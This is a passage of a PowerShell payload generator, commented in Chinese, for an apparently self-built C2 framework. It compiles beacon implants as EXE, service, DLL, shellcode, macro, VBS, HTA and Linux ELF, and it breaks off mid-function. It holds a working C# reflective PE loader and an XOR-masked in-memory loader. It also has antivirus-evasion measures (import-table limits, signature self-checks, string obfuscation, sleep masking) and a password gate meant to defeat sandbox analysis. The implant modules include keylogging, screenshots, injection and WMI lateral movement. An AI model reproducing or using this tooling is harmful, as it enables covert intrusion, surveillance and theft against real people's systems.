# cs_dev :: gen_payload2.ps1  --  协议 v2 Payload 生成器 (多格式)
# ==========================================================================
# v1 (tools\gen_payload.ps1) -> kits\beacon\win_beacon.c   密钥硬编码 / 明文命令
# v2 (本脚本)              -> kits\beacon\beacon2.c      每会话 RSA-2048 交换密钥,
#                            AES-256-CBC + HMAC-SHA256 认证, TLV 结构化任务
#
# 支持的 10 种格式:
#   win2-exe      Windows x64 可执行文件 (GUI 子系统)
#   win2-console  Windows x64 可执行文件 (控制台子系统)
#   win2-svc      Windows x64 服务程序 (windows 子系统 + mainCRTStartup)
#   win2-dll      Windows x64 DLL (自写 DllMain 外壳, 独立线程内跑 beacon_run)
#   win2-raw      Windows x64 raw shellcode (.text 段 objcopy 提取)
#   win2-ps1      PowerShell 反射加载器 (内嵌 base64 PE, 自实现 PE 映射)
#   win2-vba      VBA 宏 (HeapCreate/HeapAlloc/RtlMoveMemory/CreateThread)
#   win2-vbs      VBScript (base64 -> ADODB.Stream 落地 -> WScript.Shell 执行)
#   win2-cs       C# 加载器源码 (可 csc 直接编译, 内嵌同款反射加载器)
#   win2-hta      HTML Application (内嵌 VBScript 落地执行)
#
# 编译期宏: C2_HOST C2_PORT C2_SSL C2_URI C2_SLEEP C2_JITTER
# 链接:     -lwinhttp -ladvapi32
#
# 用法:
#   .\gen_payload2.ps1 -Format win2-exe -Host_ 1.2.3.4 -Port 8443 -Ssl
#   .\gen_payload2.ps1 -Format win2-raw -Host_ 1.2.3.4 -Port 8443 -Sleep 3000 -Jitter 20
#   .\gen_payload2.ps1 -List
#
# 说明: 本脚本必须以 UTF-8 (带 BOM) 保存 —— PowerShell 5.1 解析无 BOM 的中文
#       脚本时会按 GBK 解码进而语法错乱, 这是本项目已踩过的坑。
# ==========================================================================
[CmdletBinding()]
param(
    [string] $Format  = 'win2-exe',
    [string] $Host_   = '',
    [int]    $Port    = 8443,
    [switch] $Ssl,
    [string] $Uri     = '/submit',
    [int]    $Sleep   = 5000,
    [int]    $Jitter  = 10,
    [string] $Xform   = 'raw',
    [string] $Profile = '',
    [switch] $SleepMask,
    [string] $IdHeader = '',
    [string] $IdValue  = 'csdev-1',
    [string] $OutFile = '',
    [string] $MinGw   = 'D:\mingw64\bin',
    # 启动口令(可选): 给了就编译进"盐 + SHA256(盐||口令)"摘要, 植入体启动时必须带这个
    # 口令做参数(或设环境变量 CSDEV_TOKEN)才上线; 不给则行为与原来一致, 直接运行。
    # 用途: 自动化沙箱/分析平台直接双击样本时拿不到任何行为。
    [string] $Password = '',
    [switch] $List,
    [switch] $Quiet
)

$ErrorActionPreference = 'Stop'
$DevDir = Split-Path -Parent $PSScriptRoot
$BuildD = Join-Path $DevDir 'build\payload'
New-Item -ItemType Directory -Force -Path $BuildD | Out-Null

$FORMATS = [ordered]@{
    'win2-exe'     = 'Windows x64 可执行文件 (GUI 子系统)'
    'win2-console' = 'Windows x64 可执行文件 (控制台子系统)'
    'win2-svc'     = 'Windows x64 服务程序 (sc create 安装)'
    'win2-dll'     = 'Windows x64 DLL (rundll32 或反射加载)'
    'win2-raw'     = 'Windows x64 raw shellcode (.text 段)'
    'win2-ps1'     = 'PowerShell 反射加载器 (内嵌 base64 PE)'
    'win2-vba'     = 'VBA 宏 (HeapCreate + CreateThread)'
    'win2-vbs'     = 'VBScript (落地 + WScript.Shell 执行)'
    'win2-cs'      = 'C# 加载器源码 (csc 直接编译)'
    'win2-hta'     = 'HTML Application (内嵌 VBScript 加载器)'
    'win2-udrl'    = 'UDRL 反射加载器 (内嵌 XOR 掩码 PE, 全程不落盘)'
    'win2-tcp'     = 'Windows x64 EXE (TCP 直连承载, 配服务端 /api/listener/add kind=tcp)'
    'linux2-elf'   = 'Linux x64 ELF (静态链接, 协议v2 HTTP /submit)'
    'linux2-dyn'   = 'Linux x64 ELF (动态链接, 协议v2 HTTP /submit)'
}

# 免杀硬约束: PE 导入表只允许这四个 DLL
$ALLOWED_DLLS = @('ADVAPI32.dll','KERNEL32.dll','msvcrt.dll','WINHTTP.dll')

# 特征自检关键字 (CS / 已知 loader 指纹)
$BAD_STRINGS = @('beacon.dll','ReflectiveLoader','wininet','%windir%','/submit.php','MSSE-','KBRK')

if ($List -or -not $Host_) {
    Write-Host ""
    Write-Host "  cs_dev 协议 v2 Payload 生成器" -ForegroundColor Cyan
    Write-Host "  =================================================="
    foreach ($k in $FORMATS.Keys) {
        Write-Host ("    {0,-14} {1}" -f $k, $FORMATS[$k])
    }
    Write-Host ""
    Write-Host "  用法: .\gen_payload2.ps1 -Format win2-exe -Host_ 1.2.3.4 -Port 8443 -Ssl"
    Write-Host "  可选: -Uri /submit  -Sleep 5000  -Jitter 10  -OutFile <路径>  -MinGw <目录>  -Quiet"
    Write-Host ""
    return
}

if (-not $FORMATS.Contains($Format)) {
    throw "未知格式: $Format  (用 -List 查看全部)"
}
if ($Port -lt 1 -or $Port -gt 65535) { throw "端口非法: $Port" }
if ($Sleep -lt 100 -or $Sleep -gt 86400000) { throw "Sleep 非法 (100..86400000): $Sleep" }
if ($Jitter -lt 0 -or $Jitter -gt 90) { throw "Jitter 非法 (0..90): $Jitter" }
if ($Uri -notmatch '^/[A-Za-z0-9_\-./]{0,120}$') { throw "Uri 非法 (须以 / 开头且仅含字母数字 _ - . /): $Uri" }
if ($Host_ -match '["\\\s]') { throw "Host_ 非法: $Host_" }

function Say($m, $c = 'Gray') { Write-Host $m -ForegroundColor $c }
function SayQ($m, $c = 'Gray') { if (-not $Quiet) { Write-Host $m -ForegroundColor $c } }

$Utf8Bom = New-Object System.Text.UTF8Encoding($true)
$Utf8Raw = New-Object System.Text.UTF8Encoding($false)

# ANSI(936) 编码器: WSH / VBE / mshta 都按系统 ANSI 解析脚本文件。
# 若给 .vbs/.bas/.hta 写 UTF-8 中文, 中文多字节会被 DBCS 解码吞掉后一个字节,
# 连换行和代码一起吃掉 -> 实测 cscript 报 "语法错误"。必须用 GBK 落盘。
$AnsiEnc = $null
try { [System.Text.Encoding]::RegisterProvider([System.Text.CodePagesEncodingProvider]::Instance) } catch { }
try { $AnsiEnc = [System.Text.Encoding]::GetEncoding(936) } catch { $AnsiEnc = [System.Text.Encoding]::ASCII }

# 产物编码策略:
#   'bom'  -> UTF-8 BOM   : .ps1 / .cs (PowerShell 5.1 与 csc 都认)
#   'ansi' -> GBK         : .vbs / .bas / .hta (WSH / VBE / mshta 的本地编码)
function Save-Text([string]$Path, [string]$Text, [string]$Enc) {
    switch ($Enc) {
        'bom'  { [System.IO.File]::WriteAllText($Path, $Text, $Utf8Bom) }
        'ansi' { [System.IO.File]::WriteAllText($Path, $Text, $AnsiEnc) }
        default { [System.IO.File]::WriteAllText($Path, $Text, $Utf8Raw) }
    }
}

# base64 按固定宽度切块 (用于 .cs / .bas 的多行字符串常量)
function Split-B64([string]$Text, [int]$Width) {
    $parts = New-Object System.Collections.ArrayList
    for ($i = 0; $i -lt $Text.Length; $i += $Width) {
        $n = [Math]::Min($Width, $Text.Length - $i)
        [void]$parts.Add($Text.Substring($i, $n))
    }
    return $parts
}

# ------------------------------------------------------------------ 环境探测
$gcc = Join-Path $MinGw 'gcc.exe'
$objdump = Join-Path $MinGw 'objdump.exe'
$objcopy = Join-Path $MinGw 'objcopy.exe'

$SrcList = New-Object System.Collections.ArrayList
$BeaconDir = Join-Path $DevDir 'kits\beacon'
[void]$SrcList.Add((Join-Path $BeaconDir 'beacon2.c'))
# beacon2.c 依赖 ops 模块 (截屏/键盘/Token/注入/端口扫描); 仓库若尚未引入则跳过
$OpsSrc = Join-Path $BeaconDir 'beacon2_ops.c'
if (Test-Path $OpsSrc) { [void]$SrcList.Add($OpsSrc) }
# xform 模块: profile body 变换 (base64/mask/netbios), 供 -Xform 使用
$XformSrc = Join-Path $BeaconDir 'xform.c'
if (Test-Path $XformSrc) { [void]$SrcList.Add($XformSrc) }
# BOF/COFF 内存加载器 + Beacon API 表
$BofSrc = Join-Path $BeaconDir 'bof.c'
$BofApiSrc = Join-Path $BeaconDir 'bof_api.c'
if ((Test-Path $BofSrc) -and (Test-Path $BofApiSrc)) {
    [void]$SrcList.Add($BofSrc)
    [void]$SrcList.Add($BofApiSrc)
}
# SOCKS5 / rportfwd 转发模块
$ProxySrc = Join-Path $BeaconDir 'beacon2_proxy.c'
if (Test-Path $ProxySrc) { [void]$SrcList.Add($ProxySrc) }
# 自包含 sleep mask (休眠期内存掩码)
$MaskSrc = Join-Path $BeaconDir 'sleepmask2.c'
if (Test-Path $MaskSrc) { [void]$SrcList.Add($MaskSrc) }
# CLR hosting (execute-assembly)
$ClrSrc = Join-Path $BeaconDir 'clr.c'
if (Test-Path $ClrSrc) { [void]$SrcList.Add($ClrSrc) }
# 原生 wmiexec (WMI/DCOM 横向移动; ole32/oleaut32/mpr 全部运行期解析)
$WmiSrc = Join-Path $BeaconDir 'wmi.c'
if (Test-Path $WmiSrc) { [void]$SrcList.Add($WmiSrc) }
# 截屏 JPEG 编码 (GDI+ 动态解析)
$JpegSrc = Join-Path $BeaconDir 'jpeg.c'
if (Test-Path $JpegSrc) { [void]$SrcList.Add($JpegSrc) }
# 连续截图流
$ShotSrc = Join-Path $BeaconDir 'shotstream.c'
if (Test-Path $ShotSrc) { [void]$SrcList.Add($ShotSrc) }
[void]$SrcList.Add((Join-Path $DevDir 'kits\proto\frame.c'))
[void]$SrcList.Add((Join-Path $DevDir 'kits\crypto\aes.c'))
[void]$SrcList.Add((Join-Path $DevDir 'kits\crypto\sha256.c'))
[void]$SrcList.Add((Join-Path $DevDir 'kits\crypto\rsa.c'))
[string[]]$SrcFiles = $SrcList.ToArray()

$DllWrapper = Join-Path $DevDir 'kits\packer\beacon2_dll.c'
$UdrlSrc = Join-Path $DevDir 'kits\packer\udrl2.c'
$RawWrapper = Join-Path $DevDir 'kits\packer\beacon2_raw.c'
$PubKey     = Join-Path $BeaconDir 'pubkey.h'

$IsNative  = $Format -in @('win2-exe','win2-console','win2-svc','win2-dll','win2-raw','win2-tcp')
$IsScript  = $Format -in @('win2-ps1','win2-vba','win2-vbs','win2-cs','win2-hta')

if ($IsNative -or $Format -in @('win2-ps1','win2-vba','win2-vbs','win2-cs','win2-hta')) {
    if (-not (Test-Path $gcc)) { throw "gcc 不存在: $gcc  (用 -MinGw 指定目录)" }
}
foreach ($s in $SrcList) {
    if (-not (Test-Path $s)) { throw "源码缺失: $s" }
}
# 公钥是 v2 的硬依赖: RSA-2048 会话密钥交换全靠它
if (-not (Test-Path $PubKey)) {
    throw ("缺少内嵌公钥 {0}`n        请先运行: tools\gen_keypair.ps1  (轮换密钥后必须重新生成全部植入体)" -f $PubKey)
}

# 编译期字符串混淆表: bof_api.c 的 API 名清单变了就必须重生成, 否则 CS_ENC_* 未定义。
# 生成器只扫源码, 很快; 失败不致命(头文件通常已存在), 但会给出提示。
$ObfGen = Join-Path $PSScriptRoot 'gen_obf_names.ps1'
if (Test-Path $ObfGen) {
    try {
        $obfOut = & $ObfGen 2>&1
        SayQ ("    [obf] {0}" -f ($obfOut | Select-Object -First 1)) 'DarkGray'
    } catch {
        Say ("    [!] 混淆表生成失败(继续用现有 cs_obf_names.h): " + $_.Exception.Message) 'Yellow'
    }
}
if (-not $Quiet -and -not (Test-Path $OpsSrc)) {
    Say "    [!] 未发现 beacon2_ops.c, 按纯核心模块编译" 'DarkYellow'
}

# ------------------------------------------------------------------ 编译参数
# 字符串宏在命令行里的引号规则两代 PowerShell 不同:
#   5.1 : 原样拼命令行, 必须自己写 \" 才能让 gcc 看到引号
#   7+  : 按 argv 语义自动转义, 直接写 " 即可 (多写反斜杠反而会进宏体)
$q = if ($PSVersionTable.PSVersion.Major -ge 6) { '"' } else { '\"' }
$defs = @(
    ('-DC2_HOST=' + $q + $Host_ + $q),
    ("-DC2_PORT=$Port"),
    ('-DC2_URI=' + $q + $Uri + $q),
    ("-DC2_SLEEP=$Sleep"),
    ("-DC2_JITTER=$Jitter"),
    ('-DC2_XFORM=' + $q + $Xform + $q)
)
if ($SleepMask) { $defs += '-DC2_SLEEP_MASK=1' }

# 启动口令门控: 只把"随机盐 + 摘要"编进二进制, 明文口令不留痕。
# 盐每次生成都随机 -> 同一口令在不同构建里的摘要不同, 无法用预计算表反查。
$TokenSalt = ''
if ($Password -ne '') {
    if ($Password.Length -lt 4) { throw "口令太短(至少 4 个字符): 用 -Password 指定, 或留空表示不启用门控" }
    if ($Password -match '\s')  { throw "口令不能含空白字符(植入体按空白切分命令行): $Password" }
    $saltBytes = New-Object byte[] 8
    [System.Security.Cryptography.RandomNumberGenerator]::Create().GetBytes($saltBytes)
    $TokenSalt = -join ($saltBytes | ForEach-Object { '{0:x2}' -f $_ })
    $sha = [System.Security.Cryptography.SHA256]::Create()
    $TokenHash = -join ($sha.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($TokenSalt + $Password)) | ForEach-Object { '{0:x2}' -f $_ })
    $defs += ('-DC2_TOKEN_SALT=' + $q + $TokenSalt + $q)
    $defs += ('-DC2_TOKEN_HASH=' + $q + $TokenHash + $q)
}
if ($IdHeader) {
    $defs += ('-DC2_ID_HEADER=' + $q + $IdHeader + $q)
    $defs += ('-DC2_ID_VALUE=' + $q + $IdValue + $q)
}
if ($Ssl) { $defs += '-DC2_SSL=1' }

# PowerShell 5.1 会把原生命令写到 stderr 的内容包装成终止错误 (ErrorActionPreference=Stop
# 时直接中断), gcc 的告警就会被当成致命错误。这里临时降级, 只采集文本。
function Invoke-Native([string]$Exe, [string[]]$NativeArgs) {
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    try { $out = & $Exe @NativeArgs 2>&1 } finally { $ErrorActionPreference = $prev }
    return @($out | ForEach-Object { "$_" })
}

function Invoke-Gcc([string[]]$GccArgs, [string]$Tag) {
    $log = Invoke-Native $gcc $GccArgs
    if ($log) {
        foreach ($l in $log) { SayQ ("    [{0}] {1}" -f $Tag, $l) 'DarkGray' }
    }
    return $LASTEXITCODE
}

# 编译标准植入体 (exe/dll/raw 之外的通用体), 返回产物路径
function Build-StdExe([string]$Path, [string[]]$ExtraFlags) {
    $a = @('-O2','-s') + $ExtraFlags + $defs + @('-o', $Path) + $SrcFiles + @('-lwinhttp','-ladvapi32')
    $rc = Invoke-Gcc $a 'gcc'
    if ($rc -ne 0 -or -not (Test-Path $Path)) { throw "编译失败 (gcc exit=$rc)" }
    return $Path
}

# ------------------------------------------------------------------ 报告头
if (-not $Quiet) {
    Say ""
    Say "  cs_dev 协议 v2 Payload 生成器" 'Cyan'
    Say "  =================================================="
    Say ("  格式    : {0}  ({1})" -f $Format, $FORMATS[$Format])
    Say ("  回连    : {0}://{1}:{2}{3}" -f $(if($Ssl){'https'}else{'http'}), $Host_, $Port, $Uri)
    Say ("  通道    : RSA-2048 会话交换 + AES-256-CBC + HMAC-SHA256 + TLV")
    Say ("  节奏    : sleep {0} ms, jitter {1}%" -f $Sleep, $Jitter)
    Say ("  编译    : {0}" -f $gcc)
    Say ""
    Say "[*] 生成中 ..." 'White'
}

# 默认输出路径 + 扩展名
$ExtMap = @{
    'win2-exe'='.exe'; 'win2-console'='.exe'; 'win2-svc'='.exe'; 'win2-dll'='.dll'; 'win2-raw'='.bin'; 'win2-udrl'='.exe'
    'win2-tcp'='.exe'
    'win2-ps1'='.ps1'; 'win2-vba'='.bas'; 'win2-vbs'='.vbs'; 'win2-cs'='.cs'; 'win2-hta'='.hta'
    'linux2-elf'='.elf'; 'linux2-dyn'='.elf'
}
if (-not $OutFile) {
    $OutFile = Join-Path $BuildD ("payload2_{0}_{1}_{2}{3}" -f $Format, $Host_, $Port, $ExtMap[$Format])
}

# C# 反射加载器 (win2-ps1 / win2-cs 共用)
$LoaderCs = @'
// cs_dev 自研 PE 反射加载器 (无第三方依赖)
// 作用: 在自身进程内映射 PE (重定位 + 导入表) 并执行入口点
using System;
using System.Runtime.InteropServices;

public static class CsdevLoader
{
    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern IntPtr VirtualAlloc(IntPtr addr, UIntPtr size, uint allocType, uint protect);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    private static extern IntPtr LoadLibraryA(string name);

    [DllImport("kernel32.dll", CharSet = CharSet.Ansi, EntryPoint = "GetProcAddress", SetLastError = true)]
    private static extern IntPtr GetProcAddressByName(IntPtr mod, string name);

    [DllImport("kernel32.dll", EntryPoint = "GetProcAddress", SetLastError = true)]
    private static extern IntPtr GetProcAddressByOrd(IntPtr mod, IntPtr ordinal);

    // DLL 外壳入口 (_DllMainCRTStartup) 的托管签名
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    private delegate int DllEntryDelegate(IntPtr hinst, uint reason, IntPtr reserved);

    private const uint MEM_COMMIT_RESERVE = 0x3000;
    private const uint PAGE_EXECUTE_READWRITE = 0x40;

    // RVA -> 文件偏移
    private static int RvaToOff(byte[] pe, int lfanew, int optSize, int rva)
    {
        int sec = lfanew + 0x18 + optSize;
        int num = BitConverter.ToUInt16(pe, lfanew + 0x06);
        for (int i = 0; i < num; i++)
        {
            int va = BitConverter.ToInt32(pe, sec + 0x0C);
            int vs = BitConverter.ToInt32(pe, sec + 0x08);
            int rp = BitConverter.ToInt32(pe, sec + 0x14);
            if (rva >= va && rva < va + vs) return rp + (rva - va);
            sec += 0x28;
        }
        return rva;
    }

    private static string ReadAnsi(byte[] pe, int off)
    {
        int e = off;
        while (e < pe.Length && pe[e] != 0) e++;
        if (e <= off) return "";
        return System.Text.Encoding.ASCII.GetString(pe, off, e - off);
    }

    // 反射加载: 映射镜像 -> 重定位 -> 修复导入表 -> 按 DllMain 语义调用入口
    // 返回 0 = 植入线程已启动; 负数 = 失败阶段编号
    public static int Run(byte[] pe)
    {
        if (pe == null || pe.Length < 0x100) return -1;
        int lfanew = BitConverter.ToInt32(pe, 0x3C);
        if (lfanew < 0x40 || lfanew + 0xF0 > pe.Length) return -2;
        if (BitConverter.ToUInt32(pe, lfanew) != 0x00004550u) return -3;

        int optSize   = BitConverter.ToUInt16(pe, lfanew + 0x14);
        int numSec    = BitConverter.ToUInt16(pe, lfanew + 0x06);
        int entryRva  = BitConverter.ToInt32(pe, lfanew + 0x28);
        int imageSize = BitConverter.ToInt32(pe, lfanew + 0x50);
        int hdrSize   = BitConverter.ToInt32(pe, lfanew + 0x54);
        long prefBase = BitConverter.ToInt64(pe, lfanew + 0x30);
        int dir       = lfanew + 0x18 + 0x70;              // PE32+ DataDirectory

        int impRva = BitConverter.ToInt32(pe, dir + 0x08); // [1] Import
        int relRva = BitConverter.ToInt32(pe, dir + 0x28); // [5] BaseReloc
        int relSz  = BitConverter.ToInt32(pe, dir + 0x2C);

        if (imageSize <= 0) return -4;
        IntPtr mem = VirtualAlloc(IntPtr.Zero, (UIntPtr)(uint)imageSize, MEM_COMMIT_RESERVE, PAGE_EXECUTE_READWRITE);
        if (mem == IntPtr.Zero) return -5;
        long img = (long)mem;
        long delta = img - prefBase;

        if (hdrSize > pe.Length) hdrSize = pe.Length;
        Marshal.Copy(pe, 0, mem, hdrSize);

        int secDesc = lfanew + 0x18 + optSize;
        for (int i = 0; i < numSec; i++)
        {
            int vs  = BitConverter.ToInt32(pe, secDesc + 0x08);
            int va  = BitConverter.ToInt32(pe, secDesc + 0x0C);
            int rs  = BitConverter.ToInt32(pe, secDesc + 0x10);
            int rp  = BitConverter.ToInt32(pe, secDesc + 0x14);
            int cp  = vs > rs ? rs : vs;
            if (cp > 0 && rp > 0 && rp + cp <= pe.Length)
                Marshal.Copy(pe, rp, (IntPtr)(img + va), cp);
            secDesc += 0x28;
        }

        if (relRva != 0 && relSz != 0 && delta != 0)
        {
            int p = RvaToOff(pe, lfanew, optSize, relRva);
            int end = p + relSz;
            while (p + 8 <= end)
            {
                int blockRva = BitConverter.ToInt32(pe, p);
                int blockSz  = BitConverter.ToInt32(pe, p + 4);
                if (blockSz < 8) break;
                int cnt = (blockSz - 8) / 2;
                for (int k = 0; k < cnt; k++)
                {
                    int item = BitConverter.ToUInt16(pe, p + 8 + k * 2);
                    int type = item >> 12;
                    int ofs  = item & 0x0FFF;
                    IntPtr target = (IntPtr)(img + blockRva + ofs);
                    if (type == 10)
                        Marshal.WriteInt64(target, Marshal.ReadInt64(target) + delta);
                    else if (type == 3)
                        Marshal.WriteInt32(target, Marshal.ReadInt32(target) + (int)delta);
                }
                p += blockSz;
            }
        }

        if (impRva != 0)
        {
            int p = RvaToOff(pe, lfanew, optSize, impRva);
            while (p + 20 <= pe.Length)
            {
                int oft   = BitConverter.ToInt32(pe, p);
                int nameR = BitConverter.ToInt32(pe, p + 0x0C);
                int ft    = BitConverter.ToInt32(pe, p + 0x10);
                if (oft == 0 && nameR == 0 && ft == 0) break;
                if (nameR == 0) break;

                IntPtr mod = LoadLibraryA(ReadAnsi(pe, RvaToOff(pe, lfanew, optSize, nameR)));
                if (mod == IntPtr.Zero) return -6;

                int thunk = RvaToOff(pe, lfanew, optSize, oft != 0 ? oft : ft);
                int dest  = ft;
                while (thunk + 8 <= pe.Length)
                {
                    long t = BitConverter.ToInt64(pe, thunk);
                    if (t == 0) break;
                    IntPtr fn;
                    if (t < 0)
                        fn = GetProcAddressByOrd(mod, (IntPtr)(t & 0xFFFF));
                    else
                        fn = GetProcAddressByName(mod, ReadAnsi(pe, RvaToOff(pe, lfanew, optSize, (int)t) + 2));
                    if (fn == IntPtr.Zero) return -7;
                    Marshal.WriteInt64((IntPtr)(img + dest), (long)fn);
                    thunk += 8;
                    dest += 8;
                }
                p += 20;
            }
        }

        // 入口 = DLL 外壳的 _DllMainCRTStartup, 按 DllMain(DLL_PROCESS_ATTACH) 语义调用:
        // 外壳在内部 CreateThread 启动 beacon_run 后立即返回, 不阻塞宿主进程
        DllEntryDelegate entry = (DllEntryDelegate)Marshal.GetDelegateForFunctionPointer(
            (IntPtr)(img + entryRva), typeof(DllEntryDelegate));
        return entry((IntPtr)img, 1u, IntPtr.Zero) != 0 ? 0 : -8;
    }
}
'@

$PayloadPath = $null
$Written     = @()

# =========================================================== 1) 原生 PE / raw
if ($IsNative) {
    switch ($Format) {
        'win2-exe'     { $PayloadPath = Build-StdExe $OutFile @('-mwindows') }
        # win2-console / win2-tcp 都是控制台子系统; 后者多一个 -DC2_TRANSPORT_TCP=1,
        # 走裸 TCP 承载(与服务端 /api/listener/add kind=tcp 配套)。
        # 注意: HTTP 承载的载荷**不能**投放到 TCP listener 上 —— 协议不同, 表现是连上就沉默。
        'win2-console' { $PayloadPath = Build-StdExe $OutFile @('-Wl,-subsystem,console') }
        'win2-tcp'     { $PayloadPath = Build-StdExe $OutFile @('-Wl,-subsystem,console','-DC2_TRANSPORT_TCP=1') }

        # 服务程序: windows 子系统但入口指向 mainCRTStartup (SCM 启动时不弹控制台)
        'win2-svc'     { $PayloadPath = Build-StdExe $OutFile @('-Wl,-subsystem,windows','-Wl,-e,mainCRTStartup') }

        # DLL: 外壳提供 _DllMainCRTStartup -> DllMain -> CreateThread(beacon_run)
        #      -nostartfiles 不参与 CRT 启动, 入口即外壳函数
        'win2-dll' {
            if (-not (Test-Path $DllWrapper)) { throw "缺少 DLL 外壳: $DllWrapper" }
            $a = @('-O2','-s') + $defs + @('-shared','-nostartfiles','-Wl,-e,_DllMainCRTStartup',
                  '-o',$OutFile,$DllWrapper) + $SrcFiles + @('-lwinhttp','-ladvapi32')
            $rc = Invoke-Gcc $a 'gcc'
            if ($rc -ne 0 -or -not (Test-Path $OutFile)) { throw "编译失败 (gcc exit=$rc)" }
            $PayloadPath = $OutFile
        }

        # raw shellcode: 裸入口 + objcopy 提取 .text
        'win2-raw' {
            if (-not (Test-Path $RawWrapper)) { throw "缺少 raw 入口外壳: $RawWrapper" }
            if (-not (Test-Path $objcopy)) { throw "objcopy 不存在: $objcopy" }
            $tmpExe = Join-Path $BuildD '_tmp_raw2.exe'
            $a = @('-O2','-s') + $defs + @('-nostartfiles','-Wl,-e,beacon_entry','-Wl,-subsystem,windows',
                  '-o',$tmpExe,$RawWrapper) + $SrcFiles + @('-lwinhttp','-ladvapi32')
            $rc = Invoke-Gcc $a 'gcc'
            if ($rc -ne 0 -or -not (Test-Path $tmpExe)) { throw "编译失败 (gcc exit=$rc)" }
            # 提取 .text **与 .c2cfg**: 运行时配置槽放在独立的 .c2cfg 节里,
            # 只提 .text 会把它丢掉, 那样生成的 raw 就没法在生成端写配置了。
            $log = Invoke-Native $objcopy @('-O','binary','--only-section=.text','--only-section=.c2cfg',$tmpExe,$OutFile)
            if ($log) { SayQ ("    [objcopy] {0}" -f ($log -join ' ')) 'DarkGray' }
            Remove-Item $tmpExe -Force -ErrorAction SilentlyContinue
            if (-not (Test-Path $OutFile)) { throw "objcopy 提取 .text 失败" }
            $PayloadPath = $OutFile
        }
    }
}

# =========================================================== 2) 内存加载类
elseif ($Format -eq 'win2-udrl') {
    # 反射加载器: 先编译植入体, 再把 PE 做 XOR 掩码转成 C 数组, 最后编进加载器。
    # 载荷全程以掩码态内嵌, 运行期在独立缓冲解密 → 镜像映射 → 抹除明文。
    if (-not (Test-Path $UdrlSrc)) { throw "缺少反射加载器源码: $UdrlSrc" }

    $stageDir = Join-Path $BuildD '_udrl'
    New-Item -ItemType Directory -Force -Path $stageDir | Out-Null
    $tmpPayload = Join-Path $stageDir 'payload_stage.exe'

    Say "[*] 编译内层植入体 ..." 'White'
    # 内层载荷指定与加载器不同的 image-base: MinGW 的 EXE 不是位置无关代码,
    # CRT 初始化依赖链接期基址, 因此必须让 u_map 能把它映射回首选地址。
    $inner = @('-O2','-s','-mwindows','-Wl,--image-base,0x180000000') + $defs + @('-o',$tmpPayload) + $SrcFiles + @('-lwinhttp','-ladvapi32')
    & $gcc @inner 2>&1 | Out-Null
    if (-not (Test-Path $tmpPayload)) { throw "内层植入体编译失败" }

    Say "[*] 生成掩码载荷数组 ..." 'White'
    $bytes = [System.IO.File]::ReadAllBytes($tmpPayload)
    $sb = New-Object System.Text.StringBuilder
    [void]$sb.AppendLine('/* 自动生成 (tools/gen_payload2.ps1), 请勿手工编辑 */')
    [void]$sb.AppendLine('#ifndef CSDEV_PAYLOAD_BLOB_H')
    [void]$sb.AppendLine('#define CSDEV_PAYLOAD_BLOB_H')
    [void]$sb.AppendLine("static const unsigned char PAYLOAD_BLOB[$($bytes.Length)] = {")
    $line = '    '
    for ($i = 0; $i -lt $bytes.Length; $i++) {
        $masked = $bytes[$i] -bxor 0x5A
        $line += ('0x{0:x2}' -f $masked)
        if ($i -lt $bytes.Length - 1) { $line += ',' }
        if (($i + 1) % 16 -eq 0) { [void]$sb.AppendLine($line); $line = '    ' }
    }
    if ($line.Trim().Length -gt 0) { [void]$sb.AppendLine($line) }
    [void]$sb.AppendLine('};')
    [void]$sb.AppendLine("#define PAYLOAD_LEN $($bytes.Length)")
    [void]$sb.AppendLine('#endif')
    $blobH = Join-Path $stageDir 'payload_blob.h'
    [System.IO.File]::WriteAllText($blobH, $sb.ToString(), (New-Object System.Text.UTF8Encoding($false)))
    Remove-Item $tmpPayload -Force

    Say "[*] 编译反射加载器 ..." 'White'
    $loadArgs = @('-O2','-s','-mwindows','-I',$stageDir,'-o',$OutFile,$UdrlSrc)
    $ldrLog = & $gcc @loadArgs 2>&1
    if ($ldrLog) {
        Say ("    gcc 输出 (exit=$LASTEXITCODE):") 'DarkYellow'
        $ldrLog | Select-Object -First 12 | ForEach-Object { Say "      $_" 'DarkGray' }
    }
    $PayloadPath = $OutFile
}

elseif ($Format -like 'linux2-*') {
    # ---------------------------------------------------------------- Linux (协议 v2)
    #
    # 为什么单列这一段: 仓库里另有一个 v1 的 Linux 植入体 (linux/beacon.c),
    # 它是**裸 TCP**协议 —— 拿去连 HTTP listener 是连不上的(实测: 进程活着、
    # 连接建立后立刻 CLOSE-WAIT、服务端一条请求都收不到)。
    # linux2-* 走 linux/beacon2_linux.c: 与 Windows 植入体同一套 v2 帧协议,
    # 直接 POST /submit, 连 HTTP listener 就能上线。
    if ($Ssl) {
        # beacon2_linux.c 里对 C2_SSL 是 #error 级别的拒绝, 这里提前给同样明确的信息
        throw "linux2-* 无内置 TLS 栈: 请去掉 -Ssl, 或在植入体前部署 TLS 终止代理 (stunnel/nginx stream)"
    }
    $linuxDir = Join-Path $DevDir 'linux'
    if (-not (Test-Path $linuxDir)) { throw "缺少 Linux 源码目录: $linuxDir" }

    # 复用 gen_payload.ps1 的 To-Wsl 写法: WSL 里访问 Windows 路径要走 /mnt/<盘符>
    $wslLinux = '/mnt/' + $linuxDir.Substring(0,1).ToLower() + ($linuxDir.Substring(2) -replace '\\','/')
    $outDir   = Split-Path -Parent $OutFile
    if (-not (Test-Path $outDir)) { New-Item -ItemType Directory -Force -Path $outDir | Out-Null }
    $wslOut   = '/mnt/' + $OutFile.Substring(0,1).ToLower() + ($OutFile.Substring(2) -replace '\\','/')
    # 修正: 原代码引用未定义的 $Dynamic, 恒为 false -> linux2-dyn 永远打成静态链接。
    # 应按格式决定: 只有 linux2-dyn 去 -static, 其余 (linux2-elf) 保持静态。
    $dl       = if ($Format -eq 'linux2-dyn') { '' } else { '-static' }

    $srcs = "beacon2_linux.c rsa_linux.c ../kits/proto/frame.c ../kits/crypto/aes.c ../kits/crypto/sha256.c"
    $flags = "-O2 -s $dl -DC2_HOST='`"$Host_`"' -DC2_PORT=$Port -DC2_SLEEP=$($Sleep)u -DC2_JITTER=$Jitter"
    if ($Uri -and $Uri -ne '/submit') { $flags += " -DC2_URI='`"$Uri`"'" }
    # 口令门控: Linux 分支用的是自己的 $flags(不是 Windows 那套 $defs), 必须单独带上,
    # 否则门控代码不会被编译进去 —— 表现是"带口令生成的 Linux 样本无参数也能跑"
    if ($TokenSalt -ne '') {
